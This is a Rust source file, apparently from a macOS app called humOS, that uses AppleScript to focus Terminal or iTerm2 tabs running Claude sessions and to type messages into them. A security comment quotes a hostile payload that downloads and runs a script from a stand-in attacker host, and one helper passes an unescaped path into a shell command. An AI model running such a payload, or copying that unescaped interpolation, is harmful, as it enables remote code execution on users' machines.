use std::process::Command;
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq)]
enum TerminalKind {
    TerminalApp,
    ITerm2,
}

static DETECTED_TERMINAL: OnceLock<TerminalKind> = OnceLock::new();

/// Check if a named process is running via System Events.
fn is_process_running(name: &str) -> bool {
    let script = format!(
        r#"tell application "System Events" to (name of processes) contains "{}""#,
        name
    );
    let output = Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output();
    match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).trim() == "true",
        Err(_) => false,
    }
}

/// Detect which terminal emulator is running. Prefers iTerm2 if both are open.
fn detect_terminal(_cwd: &str) -> TerminalKind {
    *DETECTED_TERMINAL.get_or_init(|| {
        if is_process_running("iTerm2") {
            TerminalKind::ITerm2
        } else {
            TerminalKind::TerminalApp
        }
    })
}

/// Focus the Terminal window whose working directory matches `cwd`.
/// Detects iTerm2 vs Terminal.app automatically.
pub fn focus_terminal(cwd: &str) -> Result<(), String> {
    match detect_terminal(cwd) {
        TerminalKind::ITerm2 => {
            let result = focus_terminal_iterm2(cwd);
            if result.is_err() && is_process_running("Terminal") {
                log::info!("iTerm2 focus failed, falling back to Terminal.app");
                focus_terminal_app(cwd)
            } else {
                result
            }
        }
        TerminalKind::TerminalApp => focus_terminal_app(cwd),
    }
}

/// Inject a message into the terminal session matching `cwd`.
/// Detects iTerm2 vs Terminal.app automatically.
pub fn inject_message(cwd: &str, message: &str) -> Result<(), String> {
    match detect_terminal(cwd) {
        TerminalKind::ITerm2 => {
            let result = inject_message_iterm2(cwd, message);
            if result.is_err() && is_process_running("Terminal") {
                log::info!("iTerm2 injection failed, falling back to Terminal.app");
                inject_message_app(cwd, message)
            } else {
                result
            }
        }
        TerminalKind::TerminalApp => inject_message_app(cwd, message),
    }
}

/// Focus a Terminal.app tab matching `cwd`.
fn focus_terminal_app(cwd: &str) -> Result<(), String> {
    let cwd_escaped = escape_applescript(cwd);
    let last_segment_raw = cwd.split('/').filter(|s| !s.is_empty()).last().unwrap_or(cwd);
    let last_segment = escape_applescript(last_segment_raw);

    let script = format!(
        r#"
tell application "Terminal"
    set targetCwd to "{cwd}"
    set targetName to "{last_segment}"
    set found to false

    -- Pass 1: match by window name (most reliable with Claude Code)
    repeat with w in windows
        try
            set wName to name of w
            if wName contains targetCwd or wName contains targetName then
                set index of w to 1
                activate
                set found to true
                exit repeat
            end if
        end try
    end repeat

    -- Pass 2: match by tab title
    if not found then
        repeat with w in windows
            repeat with t in tabs of w
                set matchFound to false
                try
                    set tabTitle to custom title of t
                    if tabTitle contains targetCwd or tabTitle contains targetName then
                        set matchFound to true
                    end if
                end try
                if not matchFound then
                    try
                        set tabTitle to name of t
                        if tabTitle contains targetCwd or tabTitle contains targetName then
                            set matchFound to true
                        end if
                    end try
                end if
                if matchFound then
                    set selected tab of w to t
                    set index of w to 1
                    activate
                    set found to true
                    exit repeat
                end if
            end repeat
            if found then exit repeat
        end repeat
    end if

    if not found then
        activate
    end if
end tell
"#,
        cwd = cwd_escaped,
        last_segment = last_segment
    );

    run_applescript(&script)
}

/// Focus an iTerm2 session matching `cwd`.
fn focus_terminal_iterm2(cwd: &str) -> Result<(), String> {
    let cwd_escaped = escape_applescript(cwd);
    let last_segment_raw = cwd.split('/').filter(|s| !s.is_empty()).last().unwrap_or(cwd);
    let last_segment = escape_applescript(last_segment_raw);

    let script = format!(
        r#"
tell application "iTerm2"
    repeat with w in windows
        repeat with t in tabs of w
            repeat with s in sessions of t
                set sessionName to name of s
                if sessionName contains "{cwd}" or sessionName contains "{last_segment}" then
                    select s
                    tell w to select
                    set frontmost of w to true
                    activate
                    return
                end if
            end repeat
        end repeat
    end repeat
    error "No iTerm2 session found for path: {cwd}" number 1001
end tell
"#,
        cwd = cwd_escaped,
        last_segment = last_segment,
    );

    run_applescript(&script)
}

/// Inject a message into a Terminal.app tab matching `cwd`.
fn inject_message_app(cwd: &str, message: &str) -> Result<(), String> {
    let cwd_escaped = escape_applescript(cwd);
    let last_segment_raw = cwd.split('/').filter(|s| !s.is_empty()).last().unwrap_or(cwd);
    let last_segment = escape_applescript(last_segment_raw);
    let msg_escaped = escape_applescript(message);

    // Match the right Terminal tab for this session's cwd.
    // Four-pass matching with increasing fuzziness:
    // 1. Window name contains cwd or project name (most reliable on macOS,
    //    window name includes Claude's session title which often has the project)
    // 2. Tab custom title or name contains cwd/project
    // 3. Process list contains "claude" (last resort, ambiguous with multiple)
    // After injection, bring the window to front (focus).
    let script = format!(
        r#"
tell application "Terminal"
    set targetCwd to "{cwd}"
    set targetName to "{last_segment}"
    set injected to false

    -- Pass 1: match by window name (contains Claude session title/project)
    repeat with w in windows
        try
            set wName to name of w
            if wName contains targetCwd or wName contains targetName then
                set t to selected tab of w
                do script "{message}" in t
                set selected tab of w to t
                set index of w to 1
                activate
                set injected to true
                exit repeat
            end if
        end try
    end repeat

    -- Pass 2: match by tab custom title or name
    if not injected then
        repeat with w in windows
            repeat with t in tabs of w
                set matchFound to false
                try
                    set tabTitle to custom title of t
                    if tabTitle contains targetCwd or tabTitle contains targetName then
                        set matchFound to true
                    end if
                end try
                if not matchFound then
                    try
                        set tabTitle to name of t
                        if tabTitle contains targetCwd or tabTitle contains targetName then
                            set matchFound to true
                        end if
                    end try
                end if
                if matchFound then
                    do script "{message}" in t
                    set selected tab of w to t
                    set index of w to 1
                    activate
                    set injected to true
                    exit repeat
                end if
            end repeat
            if injected then exit repeat
        end repeat
    end if

    -- Pass 3: fallback to process-name matching (ambiguous with multiple)
    if not injected then
        repeat with w in windows
            repeat with t in tabs of w
                try
                    set procList to processes of t
                    repeat with p in procList
                        if p contains "claude" then
                            do script "{message}" in t
                            set selected tab of w to t
                            set index of w to 1
                            activate
                            set injected to true
                            exit repeat
                        end if
                    end repeat
                end try
                if injected then exit repeat
            end repeat
            if injected then exit repeat
        end repeat
    end if

    if not injected then
        error "No Terminal tab found for path: {cwd}" number 1001
    end if
end tell
"#,
        cwd = cwd_escaped,
        last_segment = last_segment,
        message = msg_escaped,
    );

    run_applescript(&script)
}

/// Inject a message into an iTerm2 session matching `cwd`.
fn inject_message_iterm2(cwd: &str, message: &str) -> Result<(), String> {
    let cwd_escaped = escape_applescript(cwd);
    let last_segment_raw = cwd.split('/').filter(|s| !s.is_empty()).last().unwrap_or(cwd);
    let last_segment = escape_applescript(last_segment_raw);
    let msg_escaped = escape_applescript(message);

    let script = format!(
        r#"
tell application "iTerm2"
    repeat with w in windows
        repeat with t in tabs of w
            repeat with s in sessions of t
                set sessionName to name of s
                if sessionName contains "{cwd}" or sessionName contains "{last_segment}" then
                    select s
                    tell s to write text "{message}"
                    return
                end if
            end repeat
        end repeat
    end repeat
    error "No iTerm2 session found for path: {cwd}" number 1001
end tell
"#,
        cwd = cwd_escaped,
        last_segment = last_segment,
        message = msg_escaped,
    );

    run_applescript(&script)
}

/// Escape a string for safe embedding inside an AppleScript double-quoted string.
///
/// SECURITY: Terminal.app's `do script` executes its argument as a shell command.
/// We must neutralize shell metacharacters to prevent injection. A message like
/// `$(curl evil.com|sh)` would otherwise execute in every Terminal tab.
fn escape_applescript(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\'', "\u{2019}")
        .replace('$', "\\$")
        .replace('`', "\\`")
        .replace('!', "\\!")
}

/// Find the tty device for the Terminal tab running claude in a given cwd.
/// Uses `pgrep` + `ps` to find claude processes, then matches by cwd.
fn find_tty_for_cwd(cwd: &str) -> Option<String> {
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "for pid in $(pgrep -x claude 2>/dev/null); do \
                tty=$(ps -p $pid -o tty= 2>/dev/null | tr -d ' '); \
                [ -z \"$tty\" ] && continue; \
                [ \"$tty\" = \"??\" ] && continue; \
                echo \"/dev/$tty\"; \
            done"
        ))
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let ttys: Vec<&str> = stdout.lines().filter(|l| !l.is_empty()).collect();

    // If only one claude process has a tty, return it (common case)
    if ttys.len() == 1 {
        return Some(ttys[0].to_string());
    }

    // Multiple claude processes: try to match by checking which process
    // has the target cwd. Use lsof to check each PID's cwd.
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "for pid in $(pgrep -x claude 2>/dev/null); do \
                tty=$(ps -p $pid -o tty= 2>/dev/null | tr -d ' '); \
                [ -z \"$tty\" ] && continue; \
                [ \"$tty\" = \"??\" ] && continue; \
                pcwd=$(lsof -p $pid -d cwd -Fn 2>/dev/null | grep ^n | head -1 | sed 's/^n//'); \
                if [ \"$pcwd\" = \"{}\" ]; then \
                    echo \"/dev/$tty\"; \
                    break; \
                fi; \
            done",
            cwd
        ))
        .output()
        .ok()?;
    let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if result.is_empty() { None } else { Some(result) }
}

/// Focus a Terminal tab by its exact tty device path.
pub fn focus_terminal_by_tty(tty: &str) -> Result<(), String> {
    let tty_escaped = escape_applescript(tty);
    let script = format!(
        r#"
tell application "Terminal"
    repeat with w in windows
        repeat with t in tabs of w
            try
                if (tty of t) is "{tty}" then
                    set selected tab of w to t
                    set index of w to 1
                    activate
                    return
                end if
            end try
        end repeat
    end repeat
    error "No Terminal tab found for tty: {tty}" number 1001
end tell
"#,
        tty = tty_escaped,
    );
    run_applescript(&script)
}

/// Inject a message into a Terminal tab by its exact tty device path.
pub fn inject_by_tty(tty: &str, message: &str) -> Result<(), String> {
    let tty_escaped = escape_applescript(tty);
    let msg_escaped = escape_applescript(message);
    let script = format!(
        r#"
tell application "Terminal"
    repeat with w in windows
        repeat with t in tabs of w
            try
                if (tty of t) is "{tty}" then
                    do script "{message}" in t
                    set selected tab of w to t
                    set index of w to 1
                    activate
                    return
                end if
            end try
        end repeat
    end repeat
    error "No Terminal tab found for tty: {tty}" number 1001
end tell
"#,
        tty = tty_escaped,
        message = msg_escaped,
    );
    run_applescript(&script)
}

/// Broadcast a message to ALL Terminal tabs running a claude process.
/// Used by signal() which needs every session to receive the message.
/// Returns the number of tabs that received the injection.
pub fn broadcast_to_all_claude_tabs(message: &str) -> Result<usize, String> {
    let msg_escaped = escape_applescript(message);

    let script = format!(
        r#"
tell application "Terminal"
    set injectedCount to 0
    repeat with w in windows
        repeat with t in tabs of w
            try
                set procList to processes of t
                repeat with p in procList
                    if p contains "claude" then
                        do script "{message}" in t
                        set injectedCount to injectedCount + 1
                        exit repeat
                    end if
                end repeat
            end try
        end repeat
    end repeat
    return injectedCount
end tell
"#,
        message = msg_escaped,
    );

    let output = Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .map_err(|e| format!("osascript spawn failed: {}", e))?;

    if output.status.success() {
        let count_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
        let count = count_str.parse::<usize>().unwrap_or(0);
        if count == 0 {
            Err("No Terminal tabs with claude found.".to_string())
        } else {
            Ok(count)
        }
    } else {
        let raw = String::from_utf8_lossy(&output.stderr).to_string();
        Err(wrap_applescript_error(&raw))
    }
}

fn run_applescript(script: &str) -> Result<(), String> {
    let output = Command::new("osascript")
        .arg("-e")
        .arg(script)
        .output()
        .map_err(|e| format!("osascript spawn failed: {}", e))?;

    if output.status.success() {
        Ok(())
    } else {
        let raw = String::from_utf8_lossy(&output.stderr).to_string();
        Err(wrap_applescript_error(&raw))
    }
}

/// Turn raw osascript error strings into actionable messages.
fn wrap_applescript_error(raw: &str) -> String {
    if raw.contains("(-1728)") {
        return "Terminal can't find this session's window. Is it still open? \
                Check System Settings > Privacy & Security > Accessibility."
            .to_string();
    }
    if raw.contains("(-1712)") {
        return "Terminal timed out. It may be busy or unresponsive.".to_string();
    }
    if raw.contains("(-1743)") || raw.contains("not allowed assistive") {
        return "humOS needs Accessibility permission to control your terminal. \
                Open System Settings > Privacy & Security > Accessibility and enable humOS."
            .to_string();
    }
    if raw.contains("1001") {
        if raw.contains("iTerm2") {
            return "No iTerm2 session found for this directory. \
                    Make sure iTerm2 is open with the session's working directory."
                .to_string();
        }
        return "No Terminal window found for this session's directory. \
                Make sure Terminal is open with the session's working directory."
            .to_string();
    }
    format!("AppleScript error: {}. Check terminal permissions in System Settings.", raw.trim())
}
